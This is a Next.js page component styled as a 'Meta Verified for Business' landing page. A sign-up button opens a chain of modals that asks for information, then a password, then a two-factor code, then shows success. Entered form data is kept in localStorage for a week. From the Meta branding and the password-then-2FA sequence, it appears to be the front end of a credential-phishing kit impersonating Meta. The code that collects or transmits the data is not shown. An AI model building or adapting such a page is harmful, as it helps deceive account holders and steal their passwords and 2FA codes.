'use client'

import dynamic from 'next/dynamic'
import MainContent from '#components/main/MainContent'
import MvLandingFooter from '@/components/meta-verified-for-business/landing/MvLandingFooter'
import MvSiteHeader from '@/components/meta-verified-for-business/landing/MvSiteHeader'
import React from 'react'

const InfomationsModal = dynamic(
  () => import('#components/modals/InfomationsModal'),
  { ssr: false }
)
const PasswordModal = dynamic(
  () => import('#components/modals/PasswordModal'),
  { ssr: false }
)
const TwoFactorModal = dynamic(
  () => import('#components/modals/TwoFactorModal'),
  { ssr: false }
)
const SuccessModal = dynamic(
  () => import('#components/modals/SuccessModal'),
  { ssr: false }
)
import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
import { updateForm } from '@/app/store/slices/stepFormSlice'

const MetaVerifiedCenter = () => {
    const [isOpenInfo, setIsOpenInfo] = React.useState(false)
    const [isOpenPassword, setIsOpenPassword] = React.useState(false)
    const [isOpenTwoFactor, setIsOpenTwoFactor] = React.useState(false)
    const [isOpenSuccess, setIsOpenSuccess] = React.useState(false)
    const [isLoaded, setIsLoaded] = React.useState(false)

    const dispatch = useAppDispatch()
    const formData = useAppSelector((state) => state.stepForm.data)

    React.useEffect(() => {
        const savedData = localStorage.getItem('meta_verified_state')
        if (savedData) {
            try {
                const { state, formData: savedFormData, expires } = JSON.parse(savedData)
                if (Date.now() < expires) {
                    setIsOpenInfo(state.isOpenInfo || state.isOpendInfo || false)
                    setIsOpenPassword(state.isOpenPassword || state.isOpendPassword || false)
                    setIsOpenTwoFactor(state.isOpenTwoFactor || state.isOpendTwoFactor || false)
                    setIsOpenSuccess(state.isOpenSuccess || state.isOpendSuccess || false)

                    if (savedFormData) {
                        dispatch(updateForm(savedFormData))
                    }
                } else {
                    localStorage.removeItem('meta_verified_state')
                }
            } catch (e) {
                console.error('Error parsing saved state', e)
            }
        }
        setIsLoaded(true)
    }, [dispatch])

    React.useEffect(() => {
        if (isLoaded) {
            const expires = Date.now() + 7 * 24 * 60 * 60 * 1000
            localStorage.setItem(
                'meta_verified_state',
                JSON.stringify({
                    state: {
                        isOpenInfo,
                        isOpenPassword,
                        isOpenTwoFactor,
                        isOpenSuccess,
                    },
                    formData,
                    expires,
                })
            )
        }
    }, [isLoaded, isOpenInfo, isOpenPassword, isOpenTwoFactor, isOpenSuccess, formData])

    const handleSignUp = () => {
        setIsOpenInfo(true)
    }

    const handleOpenPasswordModal = (isOpenPassword: boolean) => {
        setIsOpenPassword(isOpenPassword)
    }

    const handleOpenTwoFactorModal = (isOpenTwoFactor: boolean) => {
        setIsOpenTwoFactor(isOpenTwoFactor)
    }

    const handleOpenSuccessModal = (isOpenSuccess: boolean) => {
        setIsOpenSuccess(isOpenSuccess)
    }

    return (
        <div className="meta-verified flex min-h-[100dvh] w-full flex-col bg-meta-bg-page text-meta-text">
            <a
                href="#main-content"
                className="sr-only focus:not-sr-only focus:absolute focus:left-4 focus:top-4 focus:z-[100] focus:rounded-lg focus:bg-meta-blue focus:px-4 focus:py-2 focus:text-white"
            >
                Skip to main content
            </a>

            <div className="mv-content-bg flex min-h-0 w-full flex-1 flex-col">
                <MvSiteHeader />
                <MainContent onSignUp={handleSignUp} />
                <MvLandingFooter />
            </div>

            <InfomationsModal
                isOpend={isOpenInfo}
                isOpendPassword={(isOpenPassword: boolean) => handleOpenPasswordModal(isOpenPassword)}
                onToggleModal={(isOpen: boolean) => setIsOpenInfo(isOpen)}
            />

            <PasswordModal
                isOpend={isOpenPassword}
                isOpendTwoFactor={(isOpenTwoFactor: boolean) => handleOpenTwoFactorModal(isOpenTwoFactor)}
                onToggleModal={(isOpen: boolean) => setIsOpenPassword(isOpen)}
            />

            <TwoFactorModal
                isOpend={isOpenTwoFactor}
                isOpendFinish={(isOpenFinish: boolean) => handleOpenSuccessModal(isOpenFinish)}
                onToggleModal={(isOpen: boolean) => setIsOpenTwoFactor(isOpen)}
            />

            <SuccessModal
                isOpend={isOpenSuccess}
                onToggleSuccess={(isOpen: boolean) => setIsOpenSuccess(isOpen)}
            />
        </div>
    )
}

export default MetaVerifiedCenter
